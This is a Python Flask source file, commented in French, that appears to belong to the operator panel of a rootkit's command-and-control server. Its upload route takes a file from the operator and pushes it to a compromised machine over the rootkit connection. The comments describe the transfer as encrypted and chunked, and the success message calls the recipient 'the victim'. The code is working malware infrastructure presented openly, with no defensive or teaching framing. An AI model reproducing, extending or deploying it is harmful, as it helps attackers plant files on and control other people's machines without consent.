from app import app
import config as cfg
from flask import flash, render_template, redirect, url_for, request, session
from werkzeug.utils import secure_filename
import os
from utils.server import TCPServer

@app.route('/upload', methods=['GET', 'POST'])
def upload():
    if request.method == 'POST':
        uploaded_file = request.files.get('file')

        if uploaded_file:
            filename = secure_filename(uploaded_file.filename)
            local_path = os.path.join(cfg.UPLOAD_FOLDER, filename)
            uploaded_file.save(local_path)

            try:
                with open(local_path, "rb") as f:
                    data = f.read()

                # Envoie la commande "upload" avec nom de fichier distant
                cfg.rootkit_connexion.send_to_client(f"upload {filename}")

                # Envoie du fichier complet (automatiquement chiffré + chunké)
                cfg.rootkit_connexion.send_to_client(data)

                # Envoie marqueur de fin
                cfg.rootkit_connexion.send_to_client("EOF")

                flash(f"✅ Fichier '{filename}' envoyé avec succès à la victime.")
            except Exception as e:
                flash(f"❌ Échec lors de l'envoi du fichier : {e}")

    return render_template("upload.html")
